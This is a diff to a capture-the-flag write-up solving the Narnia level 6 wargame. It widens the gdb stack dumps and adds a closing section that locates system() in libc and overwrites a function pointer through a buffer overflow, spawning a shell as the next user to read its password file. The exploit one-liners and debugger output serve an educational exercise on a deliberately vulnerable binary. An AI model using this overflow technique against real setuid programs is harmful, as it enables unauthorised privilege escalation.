@@ -154,7 +154,7 @@ Starting program: /root/narnia6 $(python -c 'print "A"*8') $(python -c 'print "B
 warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
 >
 Breakpoint 1, 0x08048687 in main ()
-(gdb) x/50x $esp
+(gdb) x/100x $esp
 0xffffd4c0:	0xffffd4d8	0xffffd709	0x00000036	0x08048712
 0xffffd4d0:	0x00000003	0xffffd5a4	0x42424242	0x42424242
 0xffffd4e0:	0x41414100	0x41414141	0x08048300	0x00000003
@@ -162,12 +162,6 @@ Breakpoint 1, 0x08048687 in main ()
 0xffffd500:	0x00000003	0xffffd5a4	0xffffd5b4	0xf7fdb860
 0xffffd510:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x080482d0
 0xffffd520:	0x00000001	0xffffd560	0xf7fedc16	0xf7ffdac0
-0xffffd530:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
-0xffffd540:	0xffffd578	0x7e999ad7	0x4c8f8cc7	0x00000000
-0xffffd550:	0x00000000	0x00000000	0x00000003	0x08048450
-0xffffd560:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
-0xffffd570:	0x00000003	0x08048450	0x00000000	0x08048471
-0xffffd580:	0x08048559	0x00000003
 >```
 >
 > Ah, things appear to be coming together.  We can see that our input stops right before ```0xffffd4e8```, the address we want to try and overwrite.  Maybe we should try adding 4 more characters to our input.
@@ -178,7 +172,7 @@ Starting program: /root/narnia6 $(python -c 'print "A"*12') $(python -c 'print "
 warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
 >
 Breakpoint 1, 0x08048687 in main ()
-(gdb) x/50x $esp
+(gdb) x/100x $esp
 0xffffd4b0:	0xffffd4c8	0xffffd709	0x00000036	0x08048712
 0xffffd4c0:	0x00000003	0xffffd594	0x42424242	0x42424242
 0xffffd4d0:	0x41414100	0x41414141	0x41414141	0x00000000
@@ -186,12 +180,6 @@ Breakpoint 1, 0x08048687 in main ()
 0xffffd4f0:	0x00000003	0xffffd594	0xffffd5a4	0xf7fdb860
 0xffffd500:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x080482d0
 0xffffd510:	0x00000001	0xffffd550	0xf7fedc16	0xf7ffdac0
-0xffffd520:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
-0xffffd530:	0xffffd568	0x26e0f5dc	0x14f503cc	0x00000000
-0xffffd540:	0x00000000	0x00000000	0x00000003	0x08048450
-0xffffd550:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
-0xffffd560:	0x00000003	0x08048450	0x00000000	0x08048471
-0xffffd570:	0x08048559	0x00000003
 >```
 >
 > Nice, it looks like we can control that address. Now we need to try and point to another function and see if our theory works in practice.  Looking through the binary the only thing that jumps out as an easy test is the ```printf``` function.
@@ -209,7 +197,7 @@ Starting program: /root/narnia6 $(python -c 'print "A"*8+"\xd0\x83\x04\x08"') $(
 warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
 >
 Breakpoint 1, 0x08048687 in main ()
-(gdb) x/50x $esp
+(gdb) x/100x $esp
 0xffffd4c0:	0xffffd4d8	0xffffd70d	0x00000036	0x08048712
 0xffffd4d0:	0x00000003	0xffffd5a4	0x42424242	0xffffd400
 0xffffd4e0:	0x41414141	0x41414141	0x080483d0	0x00000000
@@ -217,12 +205,6 @@ Breakpoint 1, 0x08048687 in main ()
 0xffffd500:	0x00000003	0xffffd5a4	0xffffd5b4	0xf7fdb860
 0xffffd510:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x080482d0
 0xffffd520:	0x00000001	0xffffd560	0xf7fedc16	0xf7ffdac0
-0xffffd530:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
-0xffffd540:	0xffffd578	0x4ff74d8c	0x7de15b9c	0x00000000
-0xffffd550:	0x00000000	0x00000000	0x00000003	0x08048450
-0xffffd560:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
-0xffffd570:	0x00000003	0x08048450	0x00000000	0x08048471
-0xffffd580:	0x08048559	0x00000003
 (gdb) c
 Continuing.
 AAAAAAAAЃ[Inferior 1 (process 4288) exited with code 01]
@@ -259,7 +241,7 @@ Starting program: /root/narnia6 $(python -c 'print "A"*8+"\x30\x2c\xe9\xf7"') $(
 warning: no loadable sections found in added symbol-file system-supplied DSO at 0xf7fde000
 >
 Breakpoint 3, 0x08048687 in main ()
-(gdb) x/50x $esp
+(gdb) x/100x $esp
 0xffffd4b0:	0xffffd4c8	0xffffd705	0x00000036	0x08048712
 0xffffd4c0:	0x00000003	0xffffd594	0x42424242	0x42424242
 0xffffd4d0:	0x42424242	0x41414100	0xf7e92c30	0x00000000
@@ -267,12 +249,6 @@ Breakpoint 3, 0x08048687 in main ()
 0xffffd4f0:	0x00000003	0xffffd594	0xffffd5a4	0xf7fdb860
 0xffffd500:	0xf7ff4821	0xffffffff	0xf7ffcff4	0x080482d0
 0xffffd510:	0x00000001	0xffffd550	0xf7fedc16	0xf7ffdac0
-0xffffd520:	0xf7fdbb58	0xf7fb6ff4	0x00000000	0x00000000
-0xffffd530:	0xffffd568	0x58143abd	0x6a01ccad	0x00000000
-0xffffd540:	0x00000000	0x00000000	0x00000003	0x08048450
-0xffffd550:	0x00000000	0xf7ff39c0	0xf7e6dd6b	0xf7ffcff4
-0xffffd560:	0x00000003	0x08048450	0x00000000	0x08048471
-0xffffd570:	0x08048559	0x00000003
 (gdb) c
 Continuing.
 sh: 1: BBBB: not found
@@ -291,4 +267,61 @@ root
 >
 > I almost don't want this one to end.  I've learned a lot and it feels like we've been rewarded at every turn.  Let's head to the server and get the password knowing we may have to do a bit of remapping.
 >
+>```
+(gdb) break system
+Function "system" not defined.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (system) pending.
+(gdb) run A B      
+Starting program: /games/narnia/narnia6 A B
+A
+[Inferior 1 (process 11182) exited with code 01]
+>```
 >
+> Couldn't be that easy, right? gdb didn't find ```system``` so we're going to need another way to find that address. Another [google search](https://www.google.com/?gws_rd=ssl#q=gdb+get+library+function+address) turned up the ```info functions``` command which would return the address of all functions including those of the libraries.
+>
+>```
+(gdb) info functions
+All defined functions:
+>
+Non-debugging symbols:
+0xf7e58c90  __strtof_internal
+0xf7e58cd0  strtof
+0xf7e58d10  __strtod_internal
+0xf7e58d50  strtod
+0xf7e58d90  __strtold_internal
+0xf7e58dd0  strtold
+0xf7e5bf50  __strtof_l
+0xf7e5bf50  strtof_l
+0xf7e5f3a0  __strtod_l
+0xf7e5f3a0  strtod_l
+0xf7e62770  __strtold_l
+0xf7e62770  strtold_l
+0xf7e62cd0  __libc_system
+0xf7e62cd0  system
+0xf7e62d90  realpath
+0xf7e63340  canonicalize_file_name
+0xf7e63370  a64l
+0xf7e633b0  l64a
+0xf7e63400  getsubopt
+0xf7e63520  __xpg_basename
+0xf7e635e0  strtoimax
+0xf7e63610  strtoumax
+0xf7e63640  getcontext
+0xf7e636c0  setcontext
+0xf7e63730  makecontext
+0xf7e637a0  swapcontext
+>```
+>
+> That's a lot of functions.  I chopped the output to just show the area of importance.  We can see that our new address for ```system``` is at ```0xf7e62cd0```.
+>
+>```
+narnia6@melinda:/narnia$ ./narnia6 $(python -c 'print "A"*8+"\xd0\x2c\xe6\xf7"') $(python -c 'print "B"*8+"/bin/sh"')
+$ whoami
+narnia7
+$ cat /etc/narnia_pass/narnia7
+**********
+$ 
+>```
+>
+> Again...awesome. On to narnia7.
